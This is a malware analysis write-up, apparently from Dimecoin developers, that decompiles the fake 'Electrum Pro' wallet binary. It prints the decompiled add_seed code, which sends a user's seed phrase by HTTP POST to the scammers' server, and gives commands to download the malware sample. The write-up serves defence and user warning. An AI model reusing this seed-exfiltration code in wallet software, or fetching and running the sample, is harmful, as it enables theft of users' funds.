# Decompiling the ElectrumPro stealware

The document aims to inform users about the risks associated with "fake binaries," 
specifically in the context of Dimecoin.  By providing an example of how Bitcoin's Electrum binaries were targeted, 
it highlights a potential threat that could similarly affect Dimecoin.

The steps below will illustrate how to decompile the "Electrum Pro" Windows
binaries, and how to verify that they indeed contain bitcoin-stealing
malware.  We previously warned users against "Electrum Pro", but we
did not have formal evidence at that time.


## 0. Background

Electrum-Dime is a popular Dimecoin wallet, distributed on
[dimecoinnetwork.com](https://www.dimecoinnetwork.com) and
[dime-coin/electrum-dimecoin](https://github.com/dime-coin/electrum-dimecoin).

Recently, a website hosted at "electrum dot com" has been trying to
defraud Bitcoin Electrum users, by distributing fake Electrum binaries that
will extract the user's seed words and private keys, and send them to
a remote server. Users must be aware this is possible to happen to those using Electrum-Dime if you do not download from official sources.

For example, in the past, this kind of attack has been carried out by websites
hosted on domain names similar to electrum.org (original creators of the electrum client) (e.g. they swap two
letters, or use fancy UTF8 characters that look similar), and using
paid Google ads. Those websites are commonly just an almost exact copy
of the official one.

The "electrum dot com"
[scheme](https://www.reddit.com/r/Bitcoin/comments/8a1drz/psa_electrumcom_bought_by_scammers_to_distribute/)
is taking that attack further: the scammers have managed to take
control of [the dot com domain](https://i.imgur.com/RPqKmwf.png), and
they have developed a website with a slightly different design and
logo. The authors have been [claiming](https://archive.fo/Yuvjn) that
they are developing a legitimate fork of the Electrum project, and
that they are trying to improve user experience. The owners of
"electrum dot com" went as far as to claim that they are "currently
undergoing a public security audit which will be released soon".

Well, given they did not release such audit, we will do it in this
write-up.


## 1. Prerequisites

This guide assumes a modern Debian based Linux distribution.

1. The same version of python is needed as the one used in the binary.
For the Windows binaries, python 3.5.
[This link](https://askubuntu.com/questions/682869/how-do-i-install-a-different-python-version-using-apt-get)
might be useful if you are on too new or too old ubuntu.

2. To unpack the pyinstaller binary,
[pyinstallerextractor](https://sourceforge.net/projects/pyinstallerextractor/)
will be used:

    ```
    $ wget -O pyinstxtractor.py  https://downloads.sourceforge.net/project/pyinstallerextractor/dist/pyinstxtractor.py
    ```

3. To decompile the pyc bytecode, [uncompyle6](https://pypi.org/project/uncompyle6/)
will be used:

    ```
    $ python3.5 -m pip install uncompyle6
    ```


## 2. Download the Malware

```
$ wget https://www.electrum.com/4.0.2/ElectrumPro-4.0.2-Standalone.zip
```

At the time of writing, the file we get is:

```
$ sha256sum ElectrumPro-4.0.2-Standalone.zip
f497d2681dc00a7470fef7bcef8228964a2412889cd70b098cb8985aa1573e99  ElectrumPro-4.0.2-Standalone.zip
```

If you get a different hash, it means that the attackers have removed
the malware version from their website, in order to evade legal
takedown measures. However, a backup of electrum dot com is hosted on
archive.org, and can be used to retrieve the malware file:

```
$ wget https://web.archive.org/web/20180508092547/https://www.electrum.com/4.0.2/ElectrumPro-4.0.2-Standalone.zip
```


## 3. Uncompress Zip File

For example
```
$ 7za e ElectrumPro-4.0.2-Standalone.zip
```
(which requires p7zip)

Warning: obviously, do not execute the extracted file.


## 4. Unpack the PyInstaller Binary
```
$ python3.5 ./pyinstxtractor.py electrumpro-4.0.2.exe
```

## 5. Decompile the Python Bytecode
```
$ cd electrumpro-4.0.2.exe_extracted/out00-PYZ.pyz_extracted/
$ uncompyle6 electrum.keystore.pyc
```

The output of this command can be found
[here](https://gist.github.com/SomberNight/62d78d206001e13e30e169ef8eb2b4dc).


## 6. Review the Output

Particularly of interest are lines 223-248:

```python
def verify_version(self, v1):
    reqlist = 'https://www.electrum.com/checkversioninfo.php'
    API_ENDPOINT = reqlist
    encodedversionv1 = self.encode_version(v1)
    data = {'version': encodedversionv1}
    r = None
    try:
        r = requests.post(url=API_ENDPOINT, data=data)
        if r.status_code != 200:
            self.verify_version(v1)
        else:
            if r.text != 'current_version=' + encodedversionv1:
                self.verify_version(v1)
    except requests.exceptions.RequestException as e:
        self.verify_version(v1)

def verify_version_thread(self, v1):
    time.sleep(15)
    self.verify_version(v1)

def add_seed(self, seed):
    if self.seed:
        raise Exception('a seed exists')
    self.thread_v1 = threading.Thread(target=self.verify_version_thread, args=(seed,))
    self.thread_v1.start()
    self.seed = self.format_seed(seed)
```

`add_seed` is a method in the `keystore.py` module, that gets called
while creating or restoring a wallet. In this binary, a few extra
lines have been added by the scammers: A thread is started that
**sends** an HTTP POST request to their website, and its payload is
**the user's seed**.  This demonstrates that "Electrum Pro" is
bitcoin-stealing malware.

## 7. Closing

Users should **ONLY** download binaries from *official* sources, and they should check the GPG signatures
(official binaries are signed with
[Dhop14's key](https://pgp.mit.edu/pks/lookup?op=vindex&search=0xA3E6459E3707BC46849AC0AA964DA787DBC83054)).
Alternatively if they know how, they can run from source, or build binaries themselves.

In addition to GPG signatures, Dimecoin Developers are working to have the Electrum-Dime Windows binaries signed using the 
Windows native scheme. The goal also includes, at some point, to have an official signed package in the MacOS store as well.

### Misc

Note that this post was looking at only one of the Windows binaries
distributed by "electrum dot com", but it is safe to assume that
other Windows binaries, from non-trusted sources, are malicious as well.  We also checked the Mac
`.dmg` file, and it contained the same modifications. The Linux
package seemed harmless, presumably because the scammers did not want
to have these changes in plain sight (Linux packages are essentially
just source code).

Thanks to  `echeveria` (on Freenode); [here](https://transfer.sh/oZ4P7/electrumpro.warc.gz) is a complete copy of electrum dot com in web-archive
(archive.org format), [opentimestamped](https://transfer.sh/oq1ve/electrumpro.warc.gz.ots).

There is also a copy of the binary matching the sha256 hash in this write-up on
[archive.org](https://web.archive.org/web/20180508092547/https://www.electrum.com/4.0.2/ElectrumPro-4.0.2-Standalone.zip).

Also, a [VirusTotal URL](https://www.virustotal.com/#/file/f497d2681dc00a7470fef7bcef8228964a2412889cd70b098cb8985aa1573e99/relations)
linking the hash to the website.
